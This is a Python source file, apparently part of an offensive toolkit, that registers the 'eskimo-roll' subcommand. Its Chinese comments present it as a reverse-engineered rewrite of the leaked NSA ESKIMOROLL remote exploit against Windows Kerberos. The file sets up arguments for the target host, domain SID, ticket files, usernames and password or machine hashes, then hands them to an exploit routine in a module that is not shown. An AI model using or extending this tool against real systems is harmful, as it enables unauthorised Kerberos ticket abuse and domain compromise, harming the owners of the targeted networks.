"""eskimo-roll — ESKIMOROLL Kerberos 远程利用。

Python 重写的 NSA Eskimoroll 工具 `Eskimoroll-1.1.1.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 Kerberos 利用流程。
"""

from . import eskimo_roll


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def eskimo_roll_handle(args):
    """Run the ESKIMOROLL exploitation sequence against the supplied host."""
    return eskimo_roll.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        delay=args.delay,
        ticket_file=args.ticket_file,
        target_machine=args.target_machine,
        domain_dns=args.domain_dns,
        domain_sid=args.domain_sid,
        credential_type=args.credential_type,
        username=args.username,
        credential=args.credential,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `eskimo-roll` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eskimo-roll",
        help="ESKIMOROLL Kerberos 远程利用",
        description="Python 重写的 NSA Eskimoroll (ESKIMOROLL) Kerberos "
                    "远程利用工具 Eskimoroll-1.1.1。针对 Windows Kerberos "
                    "服务，执行 Kerberos 票据利用。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=88,
        help="目标 Kerberos 端口（默认 88）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--delay", type=int, default=0,
        help="数据包间延迟秒数（默认 0）",
    )
    p.add_argument(
        "--ticket-file", metavar="FILE",
        help="本地票据文件路径（留空为仅内存）",
    )
    p.add_argument(
        "--target-machine", metavar="NAME",
        help="目标主机 NetBIOS 名称（Unicode）",
    )
    p.add_argument(
        "--domain-dns", metavar="DOMAIN",
        help="目标域 DNS 名称（Unicode）",
    )
    p.add_argument(
        "--domain-sid", metavar="SID",
        help="目标域 SID（例如 S-1-5-21-XXXX-XXXX）",
    )
    p.add_argument(
        "--credential-type",
        choices=["UnicodeCreds", "PasswordHash", "MachineHash",
                 "KerberosTicket", "KerberosFile"],
        default="UnicodeCreds",
        help="凭证类型（默认 UnicodeCreds）",
    )
    p.add_argument(
        "--username", metavar="HEX",
        help="用户名（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--credential", metavar="HEX",
        help="凭证/密码哈希（十六进制字节，Unicode）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=eskimo_roll_handle)
